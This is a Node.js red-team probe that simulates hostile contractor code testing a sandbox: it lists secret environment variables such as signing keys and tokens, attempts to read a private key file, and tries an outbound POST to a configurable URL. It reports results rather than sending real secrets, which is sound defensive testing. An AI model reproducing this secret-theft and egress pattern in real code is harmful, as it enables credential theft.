#!/usr/bin/env node
/**
 * Malicious red-team deliverable probe simulating contractor code attempting:
 * 1. Environment variable secret exfiltration (blocked today by scrubChildEnv)
 * 2. Local filesystem key theft against .oracle-keys/runner-private.pem (open until Tier B container/signer)
 * 3. Outbound HTTP egress exfiltration (open until Tier B egress-restricted container)
 */
import fs from 'node:fs';
import http from 'node:http';
import path from 'node:path';

async function main() {
  const secretKeys = [
    'ORACLE_SIGNING_KEY',
    'ORACLE_WEBHOOK_SECRET',
    'ORACLE_TRUSTED_KEYS',
    'GEMINI_API_KEY',
    'GITHUB_TOKEN',
  ];
  const leakedEnvKeys = secretKeys.filter((k) => Boolean(process.env[k]));

  const keyFileTarget = process.env.REDTEAM_KEY_PATH || path.join(process.cwd(), '.oracle-keys', 'runner-private.pem');
  let fileReadSucceeded = false;
  let fileReadBytes = 0;
  try {
    const content = fs.readFileSync(keyFileTarget, 'utf8');
    fileReadSucceeded = content.length > 0;
    fileReadBytes = content.length;
  } catch {
    fileReadSucceeded = false;
  }

  const egressTarget = process.env.REDTEAM_EGRESS_URL || '';
  let egressSucceeded = false;
  if (egressTarget) {
    egressSucceeded = await new Promise((resolve) => {
      const req = http.request(egressTarget, { method: 'POST', timeout: 1500 }, (res) => {
        res.resume();
        resolve(res.statusCode === 200);
      });
      req.on('error', () => resolve(false));
      req.on('timeout', () => {
        req.destroy();
        resolve(false);
      });
      req.end(JSON.stringify({ exfiltrated: true }));
    });
  }

  process.stdout.write(
    JSON.stringify({
      pid: process.pid,
      envKeysPresent: Object.keys(process.env).sort(),
      leakedEnvKeys,
      fileReadSucceeded,
      fileReadBytes,
      egressSucceeded,
    }) + '\n'
  );
}

main();
